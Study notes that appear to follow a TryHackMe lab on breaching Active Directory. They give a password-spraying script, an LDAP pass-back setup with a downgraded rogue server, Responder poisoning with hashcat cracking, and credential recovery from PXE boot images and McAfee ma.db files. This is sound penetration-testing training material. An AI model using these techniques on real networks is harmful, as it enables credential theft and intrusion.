# Intro

Before we can exploit AD misconfigurations for privilege escalation, lateral movement, and goal execution, you need initial access first. You need to acquire an initial set of valid AD credentials. Due to the number of AD services and features, the attack surface for gaining an initial set of AD credentials is usually significant. In this room, we will discuss several avenues, but this is by no means an exhaustive list.


Two popular methods for gaining access to that first set of AD credentials is ==**OSINT and Phishing**

# NTLM Authenticated Services

 Definition --> [[AD Basics#NetNTLM Authentication]]

NetNTLM, also often referred to as Windows Authentication or just NTLM Authentication, allows the application to play the role of a middle man between the client and AD. All authentication material is forwarded to a Domain Controller in the form of a challenge, and if completed successfully, the application will authenticate the user. The following are some of the popular examples:

- Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal.
- Remote Desktop Protocol (RDP) service of a server being exposed to the internet.
- Exposed VPN endpoints that were integrated with AD.
- Web applications that are internet-facing and make use of NetNTLM.

## Brute-force Login Attacks

these exposed services provide an excellent location to test credentials discovered using other means. However, these services can also be used directly in an attempt to recover an initial set of valid AD credentials. We could perhaps try to use these for brute force attacks if we recovered information such as valid email addresses during our initial red team recon.
Since most AD environments have account lockout configured, we won't be able to run a full brute-force attack. Instead, we need to perform a password spraying attack. Instead of trying multiple different passwords, which may trigger the account lockout mechanism, **we choose and use one password and attempt to authenticate with all the usernames we have acquired**. However, it should be noted that these types of attacks can be detected due to the amount of failed authentication attempts they will generate.

Password spray script : 
`````python
def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    #Reset valid credential counter
    count = 0
    #Iterate through all of the possible usernames
    for user in self.users:
        #Make a request to the website and attempt Windows Authentication
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        #Read status code of response to determine if authentication was successful
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed,a " + str(count) + " valid credential pairs found")
`````


# LDAP (Lightweight Directory Access Protocol)

Another method of AD authentication that applications can use is Lightweight Directory Access Protocol (LDAP) authentication. LDAP authentication is similar to NTLM authentication. However, with LDAP authentication, the application directly verifies the user's credentials. The application has a pair of AD credentials that it can use first to query LDAP and then verify the AD user's credentials.

If any of these applications or services are exposed on the internet, the same type of attacks as those leveraged against NTLM authenticated systems can be used. However, since a service using LDAP authentication requires a set of AD credentials, it opens up additional attack avenues. In essence, we can attempt to recover the AD credentials used by the service to gain authenticated access to AD. The process of authentication through LDAP is shown below:

![[LDAP Protocol.png]]
## LDAP Pass-back Attacks

LDAP Pass-back attacks can be performed when we gain access to a device's configuration where the LDAP parameters are specified. This can be, for example, the web interface of a network printer.
Usually, the credentials for these interfaces are kept to the default ones, such as `admin:admin` or `admin:password`
we can alter the LDAP configuration, such as the IP or hostname of the LDAP server. In an LDAP Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials.
Since the default port of LDAP is 389, we can use the following command:

```
nc -lvp 389
```

but if the authentication method is too secure, the credentials will not be transmitted in cleartext. With some authentication methods, the credentials will not be transmitted over the network at all! So we can't just use normal Netcat to harvest the credentials. We will need to create a rogue LDAP server and configure it insecurely to ensure the credentials are sent in plaintext.

## Hosting a Rogue LDAP Server

we will use ==OpenLDAP== to host a rogue LDAP server

to install : ``sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd

configuring the LDAP server using the following command: ``sudo dpkg-reconfigure -p low slapd``

- Make sure to press `No` when requested if you want to skip server configuration
- For the organisation and DNS domain name, you want to provide our target domain 
- ensure the database is not removed when purged

Before using the rogue LDAP server, we need to make it vulnerable by downgrading the supported authentication mechanisms. We want to ensure that our LDAP server only supports PLAIN and LOGIN authentication methods. To do this, we need to create a new ldif file, called with the following content:

```
#olcSaslSecProps.ldif 
dn: cn=config 
replace: olcSaslSecProps 
olcSaslSecProps: noanonymous,minssf=0,passcred
```

- **olcSaslSecProps:** Specifies the SASL security properties
- **noanonymous:** Disables mechanisms that support anonymous login
- **minssf:** Specifies the minimum acceptable security strength with 0, meaning no protection.

## Capturing LDAP Credentials

Our rogue LDAP server has now been configured. the authentication will occur in clear text. If you configured your rogue LDAP server correctly and it is downgrading the communication, you will receive the following error: "This distinguished name contains invalid syntax". If you receive this error, you can use a tcpdump to capture the credentials using the following command:

```
sudo tcpdump -SX -i breachad tcp port 389
```


# Authentification Relays

In Windows networks, there are a significant amount of services talking to each other, allowing users to make use of the services provided by the network.

## Server Message Block

The Server Message Block (SMB) protocol allows clients (like workstations) to communicate with a server (like a file share). In networks that use Microsoft AD, SMB governs everything from inter-network file-sharing to remote administration. Even the "out of paper" alert your computer receives when you try to print a document is the work of the SMB protocol.

However, the security of earlier versions of the SMB protocol was deemed insufficient. Several vulnerabilities and exploits were discovered that could be leveraged to recover credentials or even gain code execution on devices. Although some of these vulnerabilities were resolved in newer versions of the protocol, often organisations do not enforce the use of more recent versions since legacy systems do not support them. We will be looking at two different exploits for NetNTLM authentication with SMB:

- Since the NTLM Challenges can be intercepted, we can use offline cracking techniques to recover the password associated with the NTLM Challenge. However, this cracking process is significantly slower than cracking NTLM hashes directly.
- We can use our rogue device to stage a man in the middle attack, relaying the SMB authentication between the client and server, which will provide us with an active authenticated session and access to the target server.

## LLMNR, NBT-NS, and WPAD

We will use Responder to attempt to intercept the NetNTLM challenge to crack it. There are usually a lot of these challenges flying around on the network. Some security solutions even perform a sweep of entire IP ranges to recover information from hosts. Sometimes due to stale DNS records, these authentication challenges can end up hitting your rogue device instead of the intended host.

Responder allows us to perform Man-in-the-Middle attacks by poisoning the responses during NetNTLM authentication, tricking the client into talking to you instead of the actual server they wanted to connect to. On a real LAN, Responder will attempt to poison any  Link-Local Multicast Name Resolution (LLMNR),  NetBIOS Name Service (NBT-NS), and Web Proxy Auto-Discovery (WPAD) requests that are detected. On large Windows networks, these protocols allow hosts to perform their own local DNS resolution for all hosts on the same local network. Rather than overburdening network resources such as the DNS servers, hosts can first attempt to determine if the host they are looking for is on the same local network by sending out LLMNR requests and seeing if any hosts respond. The NBT-NS is the precursor protocol to LLMNR, and WPAD requests are made to try and find a proxy for future HTTP(s) connections.

Since these protocols rely on requests broadcasted on the local network, our rogue device would also receive these requests. Usually, these requests would simply be dropped since they were not meant for our host. However, Responder will actively listen to the requests and send poisoned responses telling the requesting host that our IP is associated with the requested hostname. By poisoning these requests, Responder attempts to force the client to connect to our AttackBox. In the same line, it starts to host several servers such as SMB, HTTP, SQL, and others to capture these requests and force authentication.

## Intercepting NetNTLM Challenge

One thing to note is that Responder essentially tries to win the race condition by poisoning the connections to ensure that you intercept the connection. This means that Responder is usually limited to poisoning authentication challenges on the local network. Since we are connected via a VPN to the network, we will only be able to poison authentication challenges that occur on this VPN network.
Although Responder would be able to intercept and poison more authentication requests when executed from our rogue device connected to the LAN of an organisation, it is crucial to understand that this behaviour can be disruptive and thus detected. By poisoning authentication requests, normal network authentication attempts would fail, meaning users and services would not connect to the hosts and shares they intend to. Do keep this in mind when using Responder on a security assessment.

- Responder tool : https://github.com/lgandx/Responder.git
- ``sudo responder -I breachad``

Responder will now listen for any LLMNR, NBT-NS, or WPAD requests that are coming in. We would leave Responder to run for a bit on a real LAN

You should receive an SMBv2 connection which Responder can use to entice and extract an NTLMv2-SSP response. It will look something like this:

NTLMPassword Spraying Attack

```shell-session
[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : <Client IP>
[SMBv2] NTLMv2-SSP Username : ZA\<Service Account Username>
[SMBv2] NTLMv2-SSP Hash     : <Service Account Username>::ZA:<NTLMv2-SSP Hash>
```

Once we have a couple, we can start to perform some offline cracking of the responses in the hopes of recovering their associated NTLM passwords. If the accounts have weak passwords configured, we have a good chance of successfully cracking them. Copy the NTLMv2-SSP Hash to a textfile. We will then use the password list provided in the downloadable files for this task and Hashcat in an attempt to crack the hash using the following command:

``hashcat -m 5600 <hash file> <password file> --force``

Any hashes that we can crack will now provide us with AD credentials for our breach!

## Relaying the Challenge

In some instances, however, we can take this a step further by trying to relay the challenge instead of just capturing it directly. This is a little bit more difficult to do without prior knowledge of the accounts since this attack depends on the permissions of the associated account. We need a couple of things to play in our favour:

- SMB Signing should either be disabled or enabled but not enforced. When we perform a relay, we make minor changes to the request to pass it along. If SMB signing is enabled, we won't be able to forge the message signature, meaning the server would reject it.
- The associated account needs the relevant permissions on the server to access the requested resources. Ideally, we are looking to relay the challenge and response of an account with administrative privileges over the server, as this would allow us to gain a foothold on the host.
- Since we technically don't yet have an AD foothold, some guesswork is involved into what accounts will have permissions on which hosts. If we had already breached AD, we could perform some initial enumeration first, which is usually the case.

This is why blind relays are not usually popular. Ideally, you would first breach AD using another method and then perform enumeration to determine the privileges associated with the account you have compromised. From here, you can usually perform lateral movement for privilege escalation across the domain. However, it is still good to fundamentally under how a relay attack works, as shown in the diagram below:

![[relay NTLM.png]]


# Microsoft Deployment Toolkit

Large organisations need tools to deploy and manage the infrastructure of the estate. In massive organisations, you can't have your IT personnel using DVDs or even USB Flash drives running around installing software on every single machine. Luckily, Microsoft already provides the tools required to manage the estate. However, we can exploit misconfigurations in these tools to also breach AD.  

## MDT and SCCM  

Microsoft Deployment Toolkit (MDT) is a Microsoft service that assists with automating the deployment of Microsoft Operating Systems (OS). Large organisations use services such as MDT to help deploy new images in their estate more efficiently since the base images can be maintained and updated in a central location.

Usually, MDT is integrated with Microsoft's System Center Configuration Manager (SCCM), which manages all updates for all Microsoft applications, services, and operating systems. MDT is used for new deployments. Essentially it allows the IT team to preconfigure and manage boot images. Hence, if they need to configure a new machine, they just need to plug in a network cable, and everything happens automatically. They can make various changes to the boot image, such as already installing default software like Office365 and the organisation's anti-virus of choice. It can also ensure that the new build is updated the first time the installation runs.

SCCM can be seen as almost an expansion and the big brother to MDT. What happens to the software after it is installed? Well, SCCM does this type of patch management. It allows the IT team to review available updates to all software installed across the estate. The team can also test these patches in a sandbox environment to ensure they are stable before centrally deploying them to all domain-joined machines. It makes the life of the IT team significantly easier.

However, anything that provides central management of infrastructure such as MDT and SCCM can also be targetted by attackers in an attempt to take over large portions of critical functions in the estate. Although MDT can be configured in various ways, for this task, we will focus exclusively on a configuration called Preboot Execution Environment (PXE) boot.

## PXE Boot  

Large organisations use PXE boot to allow new devices that are connected to the network to load and install the OS directly over a network connection. MDT can be used to create, manage, and host PXE boot images. PXE boot is usually integrated with DHCP, which means that if DHCP assigns an IP lease, the host is allowed to request the PXE boot image and start the network OS installation process. The communication flow is shown in the diagram below**:**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/8117a18103e98ee2ccda91fc87c63606.png)Once the process is performed, the client will use a TFTP connection to download the PXE boot image. We can exploit the PXE boot image for two different purposes:

- Inject a privilege escalation vector, such as a Local Administrator account, to gain Administrative access to the OS once the PXE boot has been completed.
- Perform password scraping attacks to recover AD credentials used during the install.

In this task, we will focus on the latter. We will attempt to recover the deployment service account associated with the MDT service during installation for this password scraping attack. Furthermore, there is also the possibility of retrieving other AD accounts used for the unattended installation of applications and services.

PXE Boot Image Retrieval  

Since DHCP is a bit finicky, we will bypass the initial steps of this attack. We will skip the part where we attempt to request an IP and the PXE boot preconfigure details from DHCP. We will perform the rest of the attack from this step in the process manually.

The first piece of information regarding the PXE Boot preconfigure you would have received via DHCP is the IP of the MDT server. In our case, you can recover that information from the TryHackMe network diagram.  

The second piece of information you would have received was the names of the BCD files. These files store the information relevant to PXE Boots for the different types of architecture. To retrieve this information, you will need to connect to this website: [http://pxeboot.za.tryhackme.com](http://pxeboot.za.tryhackme.com/). It will list various BCD files:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/63264e3ddce1a8b438a7c8b6d527688c.png)

Usually, you would use TFTP to request each of these BCD files and enumerate the configuration for all of them. However, in the interest of time, we will focus on the BCD file of the **x64** architecture. Copy and store the full name of this file. For the rest of this exercise, we will be using this name placeholder `x64{7B...B3}.bcd` since the files and their names are regenerated by MDT every day. Each time you see this placeholder, remember to replace it with your specific BCD filename. **Note as well that if the network has just started, these file names will only update after 10 mintes of the network being active.**  

With this initial information now recovered from DHCP (wink wink), we can enumerate and retrieve the PXE Boot image. We will be using our SSH connection on THMJMP1 for the next couple of steps, so please authenticate to this SSH session using the following:

`ssh thm@THMJMP1.za.tryhackme.com`

and the password of `Password1@`.

To ensure that all users of the network can use SSH, start by creating a folder with your username and copying the powerpxe repo into this folder:

SSHCommand Prompt

```markup
C:\Users\THM>cd Documents
C:\Users\THM\Documents> mkdir <username>
C:\Users\THM\Documents> copy C:\powerpxe <username>\
C:\Users\THM\Documents\> cd <username>
```

The first step we need to perform is using TFTP and downloading our BCD file to read the configuration of the MDT server. TFTP is a bit trickier than FTP since we can't list files. Instead, we send a file request, and the server will connect back to us via UDP to transfer the file. Hence, we need to be accurate when specifying files and file paths. The BCD files are always located in the /Tmp/ directory on the MDT server. We can initiate the TFTP transfer using the following command in our SSH session:

SSHCommand Prompt

```markup
C:\Users\THM\Documents\Am0> tftp -i <THMMDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd
Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s
```

You will have to lookup THMMDT IP with `nslookup thmmdt.za.tryhackme.com`. With the BCD file now recovered, we will be using [powerpxe](https://github.com/wavestone-cdt/powerpxe) to read its contents. Powerpxe is a PowerShell script that automatically performs this type of attack but usually with varying results, so it is better to perform a manual approach. We will use the Get-WimFile function of powerpxe to recover the locations of the PXE Boot images from the BCD file:

SSHCommand Prompt

```markup
C:\Users\THM\Documents\Am0> powershell -executionpolicy bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.   

PS C:\Users\THM\Documents\am0> Import-Module .\PowerPXE.ps1
PS C:\Users\THM\Documents\am0> $BCDFile = "conf.bcd"
PS C:\Users\THM\Documents\am0> Get-WimFile -bcdFile $BCDFile
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : <PXE Boot Image Location>
<PXE Boot Image Location>
```

WIM files are bootable images in the Windows Imaging Format (WIM). Now that we have the location of the PXE Boot image, we can again use TFTP to download this image:

SSHCommand Prompt

```markup
PS C:\Users\THM\Documents\am0> tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim
Transfer successful: 341899611 bytes in 218 second(s), 1568346 bytes/s
```

This download will take a while since you are downloading a fully bootable and configured Windows image. Maybe stretch your legs and grab a glass of water while you wait.

Recovering Credentials from a PXE Boot Image

Now that we have recovered the PXE Boot image, we can exfiltrate stored credentials. It should be noted that there are various attacks that we could stage. We could inject a local administrator user, so we have admin access as soon as the image boots, we could install the image to have a domain-joined machine. If you are interested in learning more about these attacks, you can read this [article](https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/). This exercise will focus on a simple attack of just attempting to exfiltrate credentials.

Again we will use powerpxe to recover the credentials, but you could also do this step manually by extracting the image and looking for the bootstrap.ini file, where these types of credentials are often stored. To use powerpxe to recover the credentials from the bootstrap file, run the following command:

SSHCommand Prompt

```markup
PS C:\Users\THM\Documents\am0> Get-FindCredentials -WimFile pxeboot.wim
>> Open pxeboot.wim
>>>> Finding Bootstrap.ini
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
>>>> >>>> UserID = <account>
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = <password>
```

As you can see, powerpxe was able to recover the AD credentials. We now have another set of AD credentials that we can use!

# Configuration Files

The last enumeration avenue we will explore in this network is configuration files. Suppose you were lucky enough to cause a breach that gave you access to a host on the organisation's network. In that case, configuration files are an excellent avenue to explore in an attempt to recover AD credentials. Depending on the host that was breached, various configuration files may be of value for enumeration: 

- Web application config files  
    
- Service configuration files
- Registry keys
- Centrally deployed applications  
    

Several enumeration scripts, such as [Seatbelt](https://github.com/GhostPack/Seatbelt), can be used to automate this process.

Configuration File Credentials  

However, we will focus on recovering credentials from a centrally deployed application in this task. Usually, these applications need a method to authenticate to the domain during both the installation and execution phases. An example of such as application is McAfee Enterprise Endpoint Security, which organisations can use as the endpoint detection and response tool for security.  

McAfee embeds the credentials used during installation to connect back to the orchestrator in a file called ma.db. This database file can be retrieved and read with local access to the host to recover the associated AD service account. We will be using the SSH access on THMJMP1 again for this exercise.

The ma.db file is stored in a fixed location:  

SSHCommand Prompt

```shell-session
thm@THMJMP1 C:\Users\THM>cd C:\ProgramData\McAfee\Agent\DB
thm@THMJMP1 C:\ProgramData\McAfee\Agent\DB>dir
 Volume in drive C is Windows 10
 Volume Serial Number is 6A0F-AA0F

 Directory of C:\ProgramData\McAfee\Agent\DB      

03/05/2022  10:03 AM    <DIR>          .
03/05/2022  10:03 AM    <DIR>          ..
03/05/2022  10:03 AM           120,832 ma.db      
               1 File(s)        120,832 bytes     
               2 Dir(s)  39,426,285,568 bytes free
```

We can use SCP to copy the ma.db to our AttackBox:

Terminal

```shell-session
thm@thm:~/thm# scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
thm@10.200.4.249's password:
ma.db 100%  118KB 144.1KB/s   00:00
```

To read the database file, we will use a tool called sqlitebrowser. We can open the database using the following command:

Terminal

```shell-session
thm@thm:# sqlitebrowser ma.db
```

Using sqlitebrowser, we will select the Browse Data option and focus on the AGENT_REPOSITORIES table:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/aeda85be24462cc6a3f0c03cd899053a.png)  

We are particularly interested in the second entry focusing on the DOMAIN, AUTH_USER, and AUTH_PASSWD field entries. Make a note of the values stored in these entries. However, the AUTH_PASSWD field is encrypted. Luckily, McAfee encrypts this field with a known key. Therefore, we will use the following old python2 script to decrypt the password. The script has been provided as a downloadable task file or on the AttackBox, it can be found in the `/root/Rooms/BreachingAD/task7/` directory.

**Note: The tool we will use here is quite old. It uses Python v2 and relies on an old crypto library. If you cannot get the script to work on your own VM, please make use of the AttackBox. However, there has been a recent update to the application to ensure that it works on Python3 as well, you can download the latest version here: [https://github.com/funoverip/mcafee-sitelist-pwd-decryption](https://github.com/funoverip/mcafee-sitelist-pwd-decryption)**  

You will have to unzip the mcafee-sitelist-pwd-decryption.zip file:

Terminal

```shell-session
thm@thm:~/root/Rooms/BreachingAD/task7/$ unzip mcafeesitelistpwddecryption.zip
```

By providing the script with our base64 encoded and encrypted password, the script will provide the decrypted password:

Terminal

```shell-session
thm@thm:~/root/Rooms/BreachingAD/task7/mcafee-sitelist-pwd-decryption-master$ python2 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
Crypted password   : <AUTH PASSWD VALUE>
Decrypted password : <Decrypted Pasword>
```

We now once again have a set of AD credentials that we can use for further enumeration! This is just one example of recovering credentials from configuration files. If you are ever able to gain a foothold on a host, make sure to follow a detailed and refined methodology to ensure that you recover all loot from the host, including credentials and other sensitive information that can be stored in configuration files.
